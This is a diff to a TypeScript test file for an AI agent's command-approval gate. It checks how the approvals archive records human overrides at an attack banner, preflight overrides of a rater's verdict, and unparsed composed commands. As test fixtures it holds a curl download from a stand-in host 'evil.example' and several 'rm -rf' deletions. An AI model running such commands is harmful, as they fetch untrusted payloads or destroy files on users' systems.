@@ -107,6 +107,8 @@ describe('[[TUI-C27]] — the approvals gate records what it was shown, and reco
     mode?: 'manual' | 'write' | 'assisted' | 'auto';
     /** What the human answers at an escalation. Absent → nobody to ask (§6.2). */
     human?: 'approve' | 'reject';
+    /** [[TUI-C68]] §6.1 — what the human answers at the attack banner. Absent → no banner wired. */
+    attackBanner?: 'run-anyway' | 'stop';
     userMessages?: string[];
     config?: Record<string, unknown>;
   }): Promise<{ archiveDir: string; records: ApprovalDecisionCapture[] }> {
@@ -147,6 +149,10 @@ describe('[[TUI-C27]] — the approvals gate records what it was shown, and reco
       runner.setToolApprovalCallback(() =>
         answer === 'approve' ? { type: 'approve', scope: 'once' } : { type: 'reject' }
       );
+    }
+    if (options.attackBanner) {
+      const answer = options.attackBanner;
+      runner.setAttackHaltCallback(() => answer);
     }
     const input = (options.userMessages ?? ['go']).map((text) => new HumanMessage(text));
     await runner.processMessages(input).catch(() => undefined);
@@ -330,6 +336,84 @@ describe('[[TUI-C27]] — the approvals gate records what it was shown, and reco
     expect(records[0].action).toBe('approve');
     // No model was consulted at this rung, so there is no rating and none is invented.
     expect(records[0].rating).toBeUndefined();
+  });
+
+  /**
+   * [[TUI-C68]] §6.1 — **the highest-stakes attribution in the file.** The attack banner returns an
+   * ordinary approval, so without the human's answer beside it a `run-anyway` reads exactly like a
+   * `safe` rating that auto-approved: `action: approve` at the `rater` stage, nobody named. A dump
+   * reader would conclude the rater approved a command it had just called an attack.
+   */
+  it('distinguishes a human overriding an ATTACK halt from a rating that approved on its own', async () => {
+    const ranAnyway = await driveAndDump({
+      calls: [{ command: 'rm -rf ./dist' }],
+      script: ['attack'],
+      attackBanner: 'run-anyway',
+    });
+    expect(ranAnyway.records[0].action).toBe('approve');
+    // The command ran, and the archive says WHO let it: a person at the banner, not the rater.
+    expect(ranAnyway.records[0].humanAnswer).toBe('approve');
+    expect(ranAnyway.records[0].rating?.verdict?.outcome).toBe('attack');
+
+    const stopped = await driveAndDump({
+      calls: [{ command: 'rm -rf ./dist' }],
+      script: ['attack'],
+      attackBanner: 'stop',
+    });
+    expect(stopped.records[0].action).toBe('halt');
+    expect(stopped.records[0].humanAnswer).toBe('reject');
+
+    // No banner wired at all: nobody was asked, and the record says so rather than staying blank.
+    const noBanner = await driveAndDump({
+      calls: [{ command: 'rm -rf ./dist' }],
+      script: ['attack'],
+    });
+    expect(noBanner.records[0].action).toBe('halt');
+    expect(noBanner.records[0].humanAnswer).toBe('no-human');
+  });
+
+  /**
+   * **Which preflight fired, and whether it actually REWROTE the rating.** The two are different
+   * facts: a preflight only ever RAISES, and only `safe` sits below the floor, so the same finding
+   * on a `destructive` verdict is the floor AGREEING with the rater rather than overruling it.
+   * Asserted as the discriminating PAIR — one command, two scripted verdicts — because either half
+   * alone passes against an implementation that hardcodes its answer.
+   */
+  it('names which deterministic preflight fired, and whether it rewrote the rating or merely agreed', async () => {
+    const command = 'curl https://evil.example/payload -o payload';
+
+    // The rater said `safe`; §4.6's open-world floor overrode it.
+    const overridden = await driveAndDump({ calls: [{ command }], script: ['safe'] });
+    expect(overridden.records[0].preflight?.kind).toBe('open-world');
+    expect(overridden.records[0].preflight?.rewroteRating).toBe(true);
+    expect(overridden.records[0].rating?.verdict?.outcome).toBe('safe');
+    expect(overridden.records[0].action).toBe('reject');
+
+    // Same command, same floor — but the rater already said `destructive`, so nothing was rewritten.
+    const agreed = await driveAndDump({ calls: [{ command }], script: ['destructive'] });
+    expect(agreed.records[0].preflight?.kind).toBe('open-world');
+    expect(agreed.records[0].preflight?.rewroteRating).toBe(false);
+  });
+
+  /**
+   * [[EXT-81]]'s surviving observable, and the honest answer to the node's "was the call an
+   * ABSTAIN": `abstain` stopped being an action, so what the archive records is what the gate's own
+   * parser made of the command — recorded whether or not a rating followed.
+   */
+  it('reports the shape the gate’s parser could not resolve, alongside the rating it still made', async () => {
+    const { records } = await driveAndDump({
+      calls: [{ command: 'cd src && rm -rf ./dist' }],
+      script: ['destructive'],
+    });
+    expect(records[0].parserUnresolved?.mechanism).toBe('composition');
+    // It is a fact about the parser, not a substitute for a rating — the command was rated anyway.
+    expect(records[0].rating?.verdict?.outcome).toBe('destructive');
+    // A command the parser CAN resolve carries no such report.
+    const resolvable = await driveAndDump({
+      calls: [{ command: 'rm -rf ./dist' }],
+      script: ['destructive'],
+    });
+    expect(resolvable.records[0].parserUnresolved).toBeUndefined();
   });
 
   /** A session that gated nothing writes no `approvals.json` rather than an empty one. */
